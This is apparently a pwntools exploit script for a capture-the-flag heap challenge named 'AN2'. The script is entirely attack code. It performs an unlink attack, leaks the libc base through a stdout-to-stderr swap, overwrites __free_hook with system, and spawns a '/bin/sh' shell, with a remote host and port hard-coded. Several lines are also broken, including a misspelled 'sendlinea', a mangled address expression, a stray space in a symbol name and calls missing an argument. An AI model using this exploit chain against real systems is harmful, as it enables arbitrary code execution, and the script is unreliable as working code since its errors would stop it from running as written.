# -*- coding: utf-8 -*-
from pwn import *
binary = './AN2'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0


if local == 1 :
    p = remote("47.103.214.163","20301")
else:
    p=process("./AN2")


def add(size,content):
    p.sendline('1')
    sleep(0.05)
    p.sendline(str(size))
    sleep(0.05)
    p.sendline(content)
    sleep(0.05)

def dele(index):
    p.sendline('2')
    sleep(0.05)
    p.sendline(str(index))
    sleep(0.05)


def show(idx):
    p.sendline('3')
    sleep(0.05)
    p.sendline(str(idx))
    sleep(0.05)

def edit(idx,content):
    p.sendline('4')
    sleep(0.05)
    p.sendline(str(idx))
    sleep(0.05)
    p.sendlinea(content)
    sleep(0.05)

# 程序关闭了标准输出close(1),输出函数就没用了。


add(0x90)
add(0x90)
add(0x90)
add(0x90,'/bin/sh 1>&2')
dele(0)
add(0x90)  # 0
add(0x300)
pay=p64(0)+p64(0x91)+p64(0x6020e8-0x18)+p64(0x6020e80-x10)+'\x00'*0x70+p64(0x90)+p64(0xa0)
edit(1,pay)
dele(2)
pay2='\x00'*0x18+p64(0x6020a0)+p64(0x6020e0)  # 0x1指向stdout,0x2指向堆块地址存放处chunk0。
edit(1,pay2)
edit(1,'\x40\x25') # 改stdout 为stderr 就有输出了
show(1)
p.recvuntil('content:')
lbase=u64(p.recv(6)+'\x00\x00')-libc.sym['_IO_2_1_stderr_']
success('lbase:'+hex(lbase))
edit(2,p64(lbase+libc.sym['__free_hook']))  # chunk0指向free_hook
edit(1,p64(lbase+libc.sym['_IO_2_1_stdout_'])+p64(0)+p64(lbase+libc.sym['_IO_2_ 1_stdin_'])) # 恢复stdout 和stderr
edit(0,p64(lbase+libc.sym['system']))
dele(3)
p.interactive()
